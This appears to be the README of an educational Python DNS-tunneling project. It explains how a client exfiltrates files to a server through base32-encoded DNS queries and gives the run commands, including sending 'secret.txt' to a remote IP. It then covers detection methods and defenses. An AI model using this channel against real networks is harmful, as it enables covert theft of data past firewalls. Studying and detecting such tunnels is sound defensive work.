# DNS Tunneling — Client & Server

## Project Overview

DNS Tunneling is a technique that uses the Domain Name System (DNS) as a
covert communication channel. Because DNS traffic is rarely blocked by
firewalls (networks must resolve domain names to function), an attacker can
hide arbitrary data inside DNS queries and responses.

This project implements a simple, educational DNS tunnel in Python that can
exfiltrate a file from a client machine to a server using only DNS queries.

---

## How It Works

### The Tunnel Protocol

Each file transfer follows three phases:

```
Client                                        Server
  |                                              |
  |--- start.<b32_name>.<total_hex>.tunnel.test ->|  announce filename + chunk count
  |<------------------------- "START_ACK" TXT ---|
  |                                              |
  |--- 0000.<b32_chunk_0>.tunnel.test ---------->|  send chunk 0
  |<------------------------- "ACK" TXT ---------|
  |--- 0001.<b32_chunk_1>.tunnel.test ---------->|  send chunk 1
  |<------------------------- "ACK" TXT ---------|
  |         ...                                  |
  |--- end.tunnel.test ------------------------->|  signal end of transfer
  |<------------------------- "END_ACK" TXT -----|
  |                                              | (file saved to disk)
```

### Encoding

| Step | Detail |
|------|--------|
| Raw file | Opened in binary mode |
| Chunking | Split into 25-byte pieces |
| Encoding | Each chunk → Base32 (40 chars, DNS-safe alphabet A-Z, 2-7) |
| Padding | Trailing `=` stripped from Base32; server restores it before decoding |
| Sequence | 4-hex-digit sequence number (`0000` … `ffff`, up to 65 535 chunks = ~1.6 MB) |
| Query label | `<seq_hex>.<b32_data>.tunnel.test` (≈ 57 chars, well within DNS limits) |

---

## File Structure

```
dns_tunnel/
├── server.py         ← run this first (acts as the DNS resolver)
├── client.py         ← run this on the "attacker" side
├── requirements.txt
├── README.md
└── received/         ← server saves received files here (auto-created)
```

---

## Installation

```bash
pip install -r requirements.txt
```

Only one third-party library is required: **dnslib** (used for crafting and
parsing DNS packets on both sides).

---

## Running the Project

### Step 1 — Start the server

```bash
python server.py
```

Default settings: listens on **UDP port 5353**, tunnel domain **tunnel.test**.
(Port 5353 does not require administrator/root privileges.)

```
================================================
  DNS Tunnel Server
================================================
  Listening on  : 0.0.0.0:5353  (UDP)
  Tunnel domain : tunnel.test
  Output dir    : received/
  Press Ctrl+C to stop
================================================
```

Available flags:

| Flag | Default | Description |
|------|---------|-------------|
| `--port` | `5353` | UDP port to listen on (use `53` as root for real DNS) |
| `--domain` | `tunnel.test` | Tunnel domain suffix |
| `--output` | `received` | Folder to save received files |

### Step 2 — Send a file from the client

Open a second terminal in the same folder:

```bash
# Send a small text file (both sides on the same machine)
python client.py hello.txt

# Send to a remote server
python client.py secret.txt --server 192.168.1.50 --port 5353

# Slow down the transfer (useful over noisy networks)
python client.py data.bin --delay 0.2 --retries 5
```

Available flags:

| Flag | Default | Description |
|------|---------|-------------|
| `--server` | `127.0.0.1` | Server IP address |
| `--port` | `5353` | Server port |
| `--domain` | `tunnel.test` | Must match server's `--domain` |
| `--delay` | `0.05` | Seconds to wait between queries |
| `--retries` | `3` | Retries per query on timeout |

### Example Output

**Client side:**

```
================================================
  DNS Tunnel Client
================================================
  Server  : 127.0.0.1:5353
  Domain  : tunnel.test
  File    : notes.txt  (312 bytes)
  Chunks  : 13  (25 B each)
  Delay   : 0.05 s   Retries: 3
================================================

[>] START  →  START_ACK
    Chunk [   1 / 13]  ✓
    Chunk [   2 / 13]  ✓
    ...
    Chunk [  13 / 13]  ✓

[<] END    →  END_ACK

[+] Transfer complete — all 13 chunks acknowledged.
```

**Server side:**

```
[>] New transfer starting
    Filename : notes.txt
    Chunks   : 13
    Chunk [   1 /  13]   25 B  (received  1 / 13)
    ...
    Chunk [  13 /  13]   12 B  (received 13 / 13)

[+] File saved  →  received/notes.txt  (312 bytes)
```

---

## Current Limitations

| Limitation | Detail |
|------------|--------|
| File size | Max ~1.6 MB (65 535 × 25 B); increase `CHUNK_BYTES` for larger files |
| Filename length | Keep filenames ≤ 38 characters (fits in one DNS label as base32) |
| No encryption | Data is only base32-encoded, not encrypted |
| No real DNS routing | Queries go directly to the server IP, not through a real DNS hierarchy |
| Single session | Server handles one transfer at a time |

---

## Detection Methods

Security teams use several techniques to identify DNS tunneling in network traffic:

### 1. Query Length Analysis
Normal DNS queries for websites are short (e.g., `www.google.com`).
Tunnel queries are unusually long because they carry encoded payload in the subdomain.
A query length threshold (e.g., flag anything > 50 characters) catches most tunnels.

### 2. Subdomain Entropy
Legitimate subdomains contain readable words (`mail.example.com`).
Base32-encoded data looks random (`MFRA2YTBMQ.tunnel.test`) and scores high on
Shannon entropy analysis. IDS tools like Zeek/Bro can compute this automatically.

### 3. Query Volume per Domain
A single host that sends hundreds of queries to the same domain in a short
period is suspicious. Normal browsing never queries one domain that frequently.

### 4. Uncommon Record Types
This tunnel uses TXT record queries. Most user traffic uses A/AAAA records.
A spike in TXT or NULL record queries is a red flag.

### 5. Payload-to-Response Size Ratio
In tunneling, queries are large and responses are small (just ACK strings).
This asymmetry is the opposite of normal DNS (small query, potentially large answer).

### 6. Non-existent Domain Responses
Real DNS resolvers return NXDOMAIN for unknown subdomains. A server that
replies to every random-looking subdomain with TXT data is clearly a tunnel endpoint.

---

## Defenses

| Defense | How It Helps |
|---------|-------------|
| DNS firewall (RPZ) | Block known tunnel domains |
| Rate limiting | Drop clients sending > N DNS queries/second |
| Deep packet inspection | Inspect subdomain entropy; block high-entropy queries |
| Allowlisting | Only allow DNS queries to known-good resolvers |
| DNS over HTTPS (DoH) monitoring | Monitor encrypted DNS for anomalous patterns |
| SIEM correlation | Alert when a host queries the same rare domain repeatedly |

---

## Educational Note

This project was built for academic study of network security concepts.
The techniques demonstrated (covert channels, data exfiltration via DNS)
are used in real-world attacks and are studied by defenders to build better
detection rules. Always practice these techniques only in controlled,
authorized environments.
